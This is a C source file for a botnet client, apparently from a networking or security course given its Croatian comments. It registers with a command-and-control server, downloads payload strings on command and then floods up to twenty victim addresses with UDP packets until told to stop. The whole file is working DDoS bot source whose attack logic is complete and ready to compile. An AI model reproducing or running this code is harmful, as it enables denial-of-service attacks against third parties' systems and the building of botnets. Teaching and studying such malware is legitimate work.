#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <arpa/inet.h>
#include <netdb.h>

#define MAXLEN 1024
#define S_PORT 5555

in_port_t getport(struct sockaddr *sa);
int attackVictim(char *ip, char *port, char *buf, int sock);

int main (int argc, char *argv[]){

    if(argc != 3) {
        printf("Usage: ./bot server_ip server_port\n");
        return -1;
    }

    printf("Starting BOT...\n");
    printf("\n");

    int mysock, sockfd, newfd, i, j, r, t, p, n, rv, timesock, pnum, s, e, attsock;
    struct sockaddr cli;
    struct sockaddr_in to;
    struct addrinfo hints, *res;
    char *regmsg = "REG\n"; 
    char *helmsg = "HELLO\n";

    struct ipport {
        char IP[INET_ADDRSTRLEN];
        char PORT[22];
    };

    struct candc {
        char command;
        struct ipport addresses[20];
    } candc;

    struct candc MSG;
    memset(&MSG, 0, sizeof MSG);
    
    char buf[MAXLEN] = "";
    char trashbuf[MAXLEN] = "";
    char *bufcontent = buf;
    socklen_t clilen = sizeof(cli);
    int msglen, sentbytes, recbytes, gs, error, numbytes, pready = 0;
    
    char hbuf[NI_MAXHOST], sbuf[NI_MAXSERV];
    
	char payloads[100][100];
	
	fd_set readfds;
    struct timeval tv;

    // Inicijalizacija socketa i bindanje adrese

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = AI_PASSIVE;

    gs = getaddrinfo(NULL, "5555", &hints, &res);
    if(gs == -1){
        errx(1, "Getaddrinfo error.");
    }

    mysock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	
    bind(mysock,res->ai_addr, res->ai_addrlen);
    
    // Attack sock
    
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = AI_PASSIVE;

    gs = getaddrinfo(NULL, "6666", &hints, &res);
    if(gs == -1){
        errx(1, "Getaddrinfo error.");
    }

    attsock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	
    bind(attsock,res->ai_addr, res->ai_addrlen);

    // Slanje REG poruke na CandC server

    memset(&to, 0, sizeof(to));
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = inet_addr(argv[1]);
    to.sin_port = htons(atoi(argv[2]));

    sentbytes = sendto(mysock, (const char*)regmsg, strlen(regmsg), 0, (struct sockaddr*)&to, sizeof(to));
    if(sentbytes == -1){
        errx(1, "Sento error.");
    } 
    printf("SENT REG message (%d bytes) to %s:%s.\n", sentbytes, argv[1], argv[2]);
    printf("\n");
    
    while(1){
        recbytes = recvfrom(mysock, &MSG, sizeof(MSG), 0, &cli, &clilen);
        if(recbytes == -1){
            errx(1, "Recvfrom error. here");
        }
        printf("RECEIVED MSG %c (%d bytes) from %s:%s.\n", MSG.command, recbytes, argv[1], argv[2]);
        printf("\n");

        if(MSG.command == '0'){
			
			return 0;	

        } else if(MSG.command == '1') {
    
			memset(&hints, 0, sizeof(hints));
			hints.ai_family = AF_INET;
			hints.ai_socktype = SOCK_STREAM;
			hints.ai_protocol = 0;
			hints.ai_flags |= AI_CANONNAME;

			if ((error = getaddrinfo(MSG.addresses[0].IP, MSG.addresses[0].PORT, &hints, &res)))
				errx(1, "%s", gai_strerror(error));
			
			if ((sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) == -1) {
				err(1,"socket");
			}

			if (connect(sockfd,res->ai_addr,res->ai_addrlen) == -1) {
				err(1,"connect");
			}

			if(send(sockfd, helmsg, strlen(helmsg), 0) == -1){
				err(1, "send");
			}
			
			memset(&buf, 0, sizeof(buf));
			if((numbytes = recv(sockfd, buf, MAXLEN, 0)) == -1){
				err(1, "recv");
			}
			printf("RECEIVED: %s\n", buf);
			
			p = 0;
			while(strncmp(buf + p, "\n", 1) != 0){
				p++;
			}
			
			strncpy(buf + p, ":", 1);
			strncpy(buf + p + 1, "\n", 1);
			
			
			memset(&payloads, 0, sizeof(payloads));
			pnum = 0;
			p = 0;
			s = 0;
			e = s;
			while(strncmp(buf + p, "\n", 1) != 0){
				
				if(strncmp(buf + p, ":", 1) == 0){
					e = p;
					strncpy(payloads[pnum], buf + s, e - s);
					printf("payloads[%d] ==> %s\n", pnum, payloads[pnum]);
					pnum++;
					s = p + 1;
				}

				p++;
			}
			
			pready = 1;
			printf("\n");
			
			close(sockfd);

        } else if(MSG.command == '2') {
			
			memset(&to, 0, sizeof(to));
            to.sin_family = AF_INET;
            to.sin_addr.s_addr = inet_addr(MSG.addresses[0].IP);
            to.sin_port = htons(atoi(MSG.addresses[0].PORT));

            sentbytes = sendto(mysock, (const char*)helmsg, strlen(helmsg), 0, (struct sockaddr*)&to, sizeof(to));
            if(sentbytes == -1){
                errx(1, "Sento UDP_server error.");
            } 
            printf("SENT HELLO (%d bytes) to UDP_server %s:%s.\n", sentbytes, MSG.addresses[0].IP, MSG.addresses[0].PORT);
            printf("\n");

            memset(buf, 0, sizeof(buf));
            recbytes = recvfrom(mysock, buf, sizeof(buf), 0, &cli, &clilen);
            if(recbytes == -1){
                errx(1, "Recvfrom error.");
            }
            printf("RECEIVED: %s\n", buf);
            
            p = 0;
			while(strncmp(buf + p, "\n", 1) != 0){
				p++;
			}
			
			strncpy(buf + p, ":", 1);
			strncpy(buf + p + 1, "\n", 1);
			
			memset(&payloads, 0, sizeof(payloads));
			pnum = 0;
			p = 0;
			s = 0;
			e = s;
			while(strncmp(buf + p, "\n", 1) != 0){
				
				if(strncmp(buf + p, ":", 1) == 0){
					e = p;
					strncpy(payloads[pnum], buf + s, e - s);
					printf("payloads[%d] ==> %s\n", pnum, payloads[pnum]);
					pnum++;
					s = p + 1;
				}

				p++;
			}
			
			pready = 1;

			printf("\n");
			
		} else if(MSG.command == '3') {
			
			if(attsock > mysock){
				n = attsock + 1;
			} else {
				n = mysock + 1;
			}
			
			tv.tv_sec = 1;
			tv.tv_usec = 0;
			
			p = 0;
			
			for(i = 0; i < 100; i++){	
				
					if(pready == 0) break;
					
					if(p >= pnum) p = 0;
					
					printf("Sending: %s\n", payloads[p]);
					
					for(j = 0; j < 20; j++) { 
						attackVictim(MSG.addresses[j].IP, MSG.addresses[j].PORT, payloads[p], attsock);
					}
					
					FD_ZERO(&readfds);
					
					FD_SET(mysock, &readfds);
					FD_SET(attsock, &readfds);
					
					rv = select(n, &readfds, NULL, NULL, &tv);
					
					if(rv == -1){
						errx(1, "%s", gai_strerror(rv));
					} else if (rv == 0) {
						// printf("Timeout occurred!\n");
					} else {
						if(FD_ISSET(mysock, &readfds)){
							
							memset(&buf, 0, sizeof(buf));
							recbytes = recvfrom(mysock, &trashbuf, sizeof(trashbuf), 0, &cli, &clilen);
								
							if(recbytes != -1){			
									if(strncmp(trashbuf, "4", 1) == 0){
										break;
									}
							}
							
						}
						
						if(FD_ISSET(attsock, &readfds)){
							memset(&trashbuf, 0, sizeof(trashbuf));
							recbytes = recvfrom(attsock, &trashbuf, sizeof(trashbuf), 0, &cli, &clilen);
								
							if(recbytes != -1){
								break;
							}
							
						}
						
					}
					
					FD_CLR(mysock, &readfds);	
					FD_CLR(attsock, &readfds);	
					
					p++;
			}
			
			printf("RECEIVED STOP.\n");	
			printf("\n");	
			
		}
		
        printf("Waiting for CandC message...\n");
        printf("\n");

    }

}

int attackVictim(char *ip, char *port, char *buf, int sock){
	
	// printf("Napadam %s:%s.\n", ip, port);
	
    struct sockaddr_in to;
    int sentbytes, error, recbytes, gs;
    struct addrinfo hints, *res;
    char *host;
	
	memset(&hints, 0, sizeof(hints));
	hints.ai_flags |= AI_CANONNAME;
	hints.ai_protocol = IPPROTO_UDP;
	hints.ai_family = AF_INET;

	error = getaddrinfo(ip, port, &hints, &res);
	if (error) return 0;
	
	memset(&to, 0, sizeof(to));
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = ((struct sockaddr_in*)res->ai_addr)->sin_addr.s_addr;
	to.sin_port = getport((struct sockaddr *)res->ai_addr);
	
	sentbytes = sendto(sock, buf, strlen(buf), 0, (struct sockaddr*)&to, sizeof(to));
	
	if(sentbytes == -1){
	    printf("ERROR: Couldn't sent bytes to %s:%s.\n", ip, port);
	} else {
		printf("SENT %d bytes to %s:%s.\n", sentbytes, ip, port);
	}

    return sentbytes;
}

in_port_t getport(struct sockaddr *sa){
    if (sa->sa_family == AF_INET) {
        return (((struct sockaddr_in*)sa)->sin_port);
    }
    return (((struct sockaddr_in6*)sa)->sin6_port);
}


